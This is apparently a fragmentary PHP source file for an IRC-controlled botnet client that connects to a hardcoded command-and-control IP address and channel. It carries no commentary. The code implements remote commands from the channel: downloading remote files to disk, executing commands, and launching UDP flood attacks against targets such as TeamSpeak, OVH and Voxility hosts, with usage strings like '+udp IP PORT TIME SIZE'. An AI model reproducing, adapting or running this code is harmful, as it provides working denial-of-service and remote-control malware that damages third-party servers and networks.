<?php set_time_limit(0); error_reporting(0);
    class sell
    {
        var $config = array("server" => "188.93.233.47", "port" => 
"6667", "key" => "", "prefix" => "Kleinebushidos", "maxrand" => "5", "chan" => 
"#irc", "trigger" => ".", "password" => "", "auth" => "");
        var $users = array();
        function start()
        {
            while (true) {
                if (!($this->conn = fsockopen($this->config['server'], 
$this->config['port'], $e, $s, 30))) $this->start();
                $pass = $this->config['password'];
                $alph = range("0", "9");
                $this->send("PASS " . $pass . "");
                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $ident = 
"Windows";
                else $ident = "Linux";
...
$this->join(" ");
                ...
                if ($this->buf != $old_buf) {
                    ...
                    $host = $cmd[0];
                    if ($msgcmd[0] == $this->nick) for ($i = 0; $i < 
count($msgcmd); $i++) $mcmd[$i] = $msgcmd[$i + 1];
                    else for ($i = 0; $i < count($msgcmd); $i++) 
$mcmd[$i] = $msgcmd[$i];
                    if (count($cmd) > 2) {
                        switch ($cmd[1]) {
                            case "PRIVMSG":
...
fopen($mcmd[2], "w")) {
                                                    $this->privmsg($this->config['chan'], 
"[\2download\2]: could not open output file.");
                                                } else {
                                                    if (!$get = 
file($mcmd[1])) {
                                                        $this->privmsg($this->config['chan'], 
"[\2download\2]: could not download \2" . $mcmd[1] . "\2");
                                                    } else {
                                                        for ($i = 0; $i 
<= count($get); $i++) {
                                                            fwrite($fp, 
$get[$i]);
                                                        ...
                                                        $this->privmsg($this->config['chan'], 
"[\2download\2]: file \2" . $mcmd[1] . "\2 downloaded to \2" . $mcmd[2] 
. "\2");
                                                    }
                                                    fclose($fp);
                                                }
                                                ...
                                                $this->privmsg($this->config['chan'], 
"[\2download\2]: use .download http://your.host/file /tmp/file");
                                            }
                                            break;
										case "rawudp":
                                            if (count($mcmd) > 5) {
                                                $this->rawudp($mcmd[1], 
$mcmd[2], $mcmd[3], $mcmd[4], $mcmd[5], $mcmd[6]);
                                            } else {
												$this->privmsg($this->config['chan'], "How to use: +udp IP PORT TIME SIZE CONTENT PACKETS/ms");
											}
                                            break;
										case "voxility":
                                            if (count($mcmd) > 3) {
                                                $this->voxility($mcmd[1], 
...
$mcmd[2], $mcmd[3], $mcmd[4]);
										...
										case "teamspeak":
                                            if (count($mcmd) > 3) {
                                                $this->teamspeak($mcmd[1], 
$mcmd[2], $mcmd[3], $mcmd[4]);
                                            } else {
												$this->privmsg($this->config['chan'], "How to use: +teamspeak IP PORT TIME PASTEURL");
											}
                                            break;
										case "commands":
                                            if (count($mcmd) > 0) {
                                                $this->privmsg($this->config['chan'], 
"Commands: -udp, -universal, -ovh, -rip, -voxility, -download, -exec");
                                            }
                                            break;
                                        case "die":
                                            if (count($mcmd) > 0) {
		...
		function rawudp($host, $port, $time, $size, $packets, 
$content){
			$this->privmsg($this->config['chan'], "This will 
be the end.");
			for ($i = 0; $i < $size; $i++) {
...
be the end.");
			$end = time() + $time;
			$i = 0;
			$fp = fsockopen("udp://" . $host, $port, $e, $s, 
5);
		while (true) {
            $str = 
...
(preg_split("/((\r?\n)|(\r\n?))/", $raw) as $line) {
        ...
        {
            $prefix = "theend-%s";
            $nickk = substr(str_shuffle("1234567890"), 0, 
$this->config['maxrand']);
